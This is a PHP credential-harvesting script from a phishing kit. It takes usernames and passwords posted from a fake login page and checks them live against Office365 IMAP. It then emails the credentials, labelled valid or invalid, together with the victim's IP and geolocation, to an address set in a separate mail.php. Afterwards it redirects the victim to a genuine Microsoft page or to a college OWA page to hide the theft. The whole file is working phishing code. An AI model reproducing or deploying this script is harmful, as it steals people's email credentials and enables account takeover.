<?php
error_reporting(0);
ob_start();

ini_set("output_buffering",4096);

require_once 'mail.php';

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$cip = $real_ip_adress;
$address = ip_info("Visitor", "Address");
$main_country = ip_info("Visitor", "Country");

$user = $_POST['username'];
$pass = $_POST['password'];

if(!empty($pass) && !empty($user)) {
	$validate = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass);
	if($validate){
	
		$message = "Valid Login \n";
		$message .= "----------------------\n";
		$message .= "user: ".$user."\n";
		$message .= "pass : ".$pass."\n";
		$message .= "Address : ".$cip."\n";
		$message .= "Location : ".$address."\n";
		$message .= "----------------DesignDev TrueLogin--------------\n";
		
		$subject = "$cip | Valid Login - $main_country";
		mail($resultz, $subject, $message);
		header("Location: https://protection.office.com/#/messagetrace");
		
	} else {

		$message = "InValid Login \n";
		$message .= "----------------------\n";
		$message .= "user: ".$user."\n";
		$message .= "pass : ".$pass."\n";
		$message .= "Address : ".$cip."\n";
		$message .= "Location : ".$address."\n";
		$message .= "----------------DesignDev TrueLogin--------------\n";

		$subject = "$cip | InValid Login - $main_country";
		mail($resultz, $subject, $message);
		header("Location: https://mail.sheridancollege.ca/owa");
		
	}
}

?>